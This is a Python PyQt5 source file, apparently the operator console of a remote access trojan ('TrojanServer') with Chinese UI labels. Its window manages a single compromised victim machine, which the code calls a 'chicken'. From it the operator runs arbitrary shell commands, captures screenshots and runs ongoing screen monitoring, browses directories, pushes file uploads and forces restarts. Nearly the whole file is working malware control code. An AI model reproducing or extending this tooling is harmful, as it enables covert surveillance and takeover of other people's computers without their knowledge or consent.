import json
import os
import struct
import sys
from threading import Thread

from PIL.Image import frombytes
from PyQt5 import QtWidgets
from PyQt5.QtCore import pyqtSignal, Qt, QSize
from PyQt5.QtGui import QPixmap
from PyQt5.QtWidgets import QWidget, QApplication, QListWidgetItem, QHBoxLayout, QLabel

from Detail import Ui_Form
from server import TrojanServer, Chienken

from builtins import print

STD = print


class DetailMain(QWidget, Ui_Form):
    connectsignal = pyqtSignal()
    pic_signal = pyqtSignal(QPixmap)
    consoleSignal = pyqtSignal(str)
    listSignal = pyqtSignal(list)
    pwdSignal = pyqtSignal(str)

    def __init__(self, trojanserver=None, ck=0):
        super().__init__()
        self.setupUi(self)
        self.trojanServer = trojanserver
        self.ck = ck
        self.chicken:Chienken = self.trojanServer.allChickens[ck]
        self.newname_input.setText(self.chicken.name)
        self.iplable.setText(self.chicken.ip)
        self.portlabel.setText(str(self.chicken.port))
        self.enableReiceive = False
        self.online_label.setText("在线"if self.chicken.online else "离线")
        self.recvThread = None
        self.socket = None
        self.flushtime.setText(str(5))
        self.screenwidth = 700
        self.bind()

    def waitConnection(self):
        while True:
            self.socket, addr = self.trojanServer.tcpSocket.accept()
            if addr[0] == self.chicken.ip:
                self.connectsignal.emit()
                break

    def connected(self):
        self.enableReiceive = True
        self.recvThread = Thread(target=self.receive)
        self.recvThread.daemon = True
        self.recvThread.start()
        self.infostatus.setText("已连接")
        self.connect_button.setText("断开连接")
        self.connect_button.clicked.disconnect(self.connectChicken)
        self.connect_button.clicked.connect(self.disconnected)
        self.trojanServer.cmdQ.put("msg %d ls"%self.ck)

    def displayPic(self, qmp:QPixmap):
        size = qmp.size()
        qmp = qmp.scaled(self.screenwidth, int(size.height()*( self.screenwidth / size.width())))
        self.pic_label.setPixmap(qmp)

    def localWidthChange(self):
        self.screenwidth = self.localwidth.value()

    def remoteWidthChange(self):
        self.trojanServer.cmdQ.put("msg %d set picwidth %d" % (self.ck, self.remotewidth.value()))

    def tcpPieceRecv(self,length, socket, size=1024):
        dsize = 0
        body = b''
        while dsize + size < length:
            piece = socket.recv(size)
            body += piece
            dsize += len(piece)
        body += self.socket.recv(length - dsize)
        return body

    def receive(self):
        while self.enableReiceive:
            try:
                len_struct = self.socket.recv(4)
                if len_struct:
                    lens = struct.unpack('i', len_struct)[0]
                    body = self.socket.recv(lens)
                    ty = body.decode('utf8')
                    print("000")
                    if ty == "pic":
                        print("ds")
                        d = self.socket.recv(12)
                        print(d)
                        print(len(d))
                        data = struct.unpack('iii', d)
                        print(data)
                        width, height, pic_len = data
                        # len_struct = self.socket.recv(4)
                        # pic_len = struct.unpack('i', len_struct)[0]
                        body = None
                        body = self.tcpPieceRecv(pic_len, self.socket, 1024)
                        try:
                            im = frombytes(data=body, size=(width, height), mode="RGB", decoder_name='raw')
                            self.pic_signal.emit(im.toqpixmap())
                        except:
                            STD("图片错误")
                    elif ty == "response":
                        res_len = struct.unpack('i', self.socket.recv(4))[0]
                        response = self.socket.recv(res_len)
                        self.consoleSignal.emit(response.decode("utf8"))
                    elif ty == "filelist":
                        res_len = struct.unpack('i', self.socket.recv(4))[0]
                        response = self.tcpPieceRecv(res_len, self.socket, 1024)
                        data = json.loads(response.decode('utf8'))
                        data['list'] = data['list'][:300]
                        self.listSignal.emit(data['list'])
                        self.pwdSignal.emit(data['pwd'])
            except:
                pass
        print("线程退出成功")


    def disconnected(self):
        self.enableReiceive = False
        self.trojanServer.cmdQ.put("msg %d disconnect" % self.ck)
        if self.socket:
            self.socket.close()
        self.infostatus.setText("未连接")
        self.connect_button.setText("连接")
        self.connect_button.clicked.disconnect(self.disconnected)
        self.connect_button.clicked.connect(self.connectChicken)

    def tcpPieceSend(self,data, socket, size=1024):
        dsize = 0
        data_len = len(data)
        while dsize + size <= data_len:
            socket.send(data[dsize: dsize + size])
            dsize += size
        if dsize < data_len:
            socket.send(data[dsize:])

    def connectChicken(self):
        self.infostatus.setText("正在等待建立连接...")
        thread = Thread(target=self.waitConnection)
        thread.daemon = True
        thread.start()
        self.trojanServer.cmdQ.put("msg %d connect" % self.ck)

    def upConsole(self, content):
        self.console.append(content)
        self.console.moveCursor(self.console.textCursor().End)

    def consoleDisplay(self):
        cmd = self.console_input.text()
        self.console_input.clear()
        if cmd == "cls" or cmd == 'clear':
            self.console.clear()
            return
        elif cmd == "restart":
            self.disconnected()
        elif cmd == "upload":
            filename, fileType = QtWidgets.QFileDialog.getOpenFileName(self, "选取文件", os.getcwd(),
                                                                       "All Files(*);")
            print(filename)
            single_name = os.path.basename(filename)
            length = os.path.getsize(filename)
            cmd = "msg %d upload %s %d" % (self.ck, single_name, length)
            self.console.append("$: %s" % cmd)
            self.trojanServer.cmdQ.put(cmd)
            with open(filename, 'rb') as file:
                while True:
                    data = file.read(1024)
                    if not data:
                        break
                    self.tcpPieceSend(data, self.socket, 1024)

        else:
            cmd = "msg %d dos %s" % (self.ck, cmd)
            self.console.append("$: %s" % cmd)
            self.trojanServer.cmdQ.put(cmd)

    def displayList(self, flist):
        self.listWidget.clear()
        def getWidget(name, isDir):
            widget = QWidget()
            layout_main = QHBoxLayout()
            widget.setLayout(layout_main)
            icon = QLabel()
            icon.setFixedSize(20, 20)
            icon.setPixmap(QPixmap('pic/dir_icon.png'if isDir else 'pic/file_icon.png').scaled(20, 20))

            namelabel = QLabel()
            namelabel.setText(name)

            widget.namelabel = namelabel
            widget.isDir = isDir

            layout_main.addWidget(icon)
            layout_main.addWidget(namelabel)
            return widget

        for f in flist:
            item = QListWidgetItem()
            item.setSizeHint(QSize(150, 40))
            self.listWidget.addItem(item)
            widget = getWidget(f[0], f[1])
            self.listWidget.setItemWidget(item, widget)

    def enterDir(self, item:QListWidgetItem = None):
        widget = self.listWidget.itemWidget(item)
        name = widget.namelabel.text()
        if widget.isDir:
            self.trojanServer.cmdQ.put("msg %d dos cd %s" %(self.ck, name))

    def picWatch(self):
        status = self.startpic.text()
        if status == "开启屏幕监控":
            self.startpic.setText("关闭屏幕监控")
            limit = self.flushtime.text()
            self.trojanServer.cmdQ.put("msg %d set pictime %s" %(self.ck, limit))
            self.trojanServer.cmdQ.put("msg %d picstart" % self.ck)
        else:
            self.startpic.setText("开启屏幕监控")
            self.trojanServer.cmdQ.put("msg %d picstop" % self.ck)

    def bind(self):
        self.connect_button.clicked.connect(self.connectChicken)
        self.connectsignal.connect(self.connected)
        self.get_pic.clicked.connect(lambda :self.trojanServer.cmdQ.put("msg %d pic"%self.ck))
        self.pic_signal.connect(self.displayPic)
        self.console_input.returnPressed.connect(self.consoleDisplay)
        self.consoleSignal.connect(self.upConsole)
        self.listSignal.connect(self.displayList)
        self.listWidget.itemClicked.connect(self.enterDir)
        self.freshlistbutton.clicked.connect(lambda :self.trojanServer.cmdQ.put("msg %d ls"%self.ck))
        self.backbutton.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d dos cd .." % self.ck))
        self.hombutton.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d dos cd c:/" % self.ck))
        self.pwdSignal.connect(lambda x:self.address.setText(x))
        self.startpic.clicked.connect(self.picWatch)
        self.remotewidth.valueChanged.connect(self.remoteWidthChange)
        self.localwidth.valueChanged.connect(self.localWidthChange)
        self.restartbutton.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d dos restart" % self.ck))


if __name__ == '__main__':
    tro = TrojanServer()
    app = QApplication(sys.argv)
    detail = DetailMain(tro, 0)
    detail.show()
    sys.exit(app.exec_())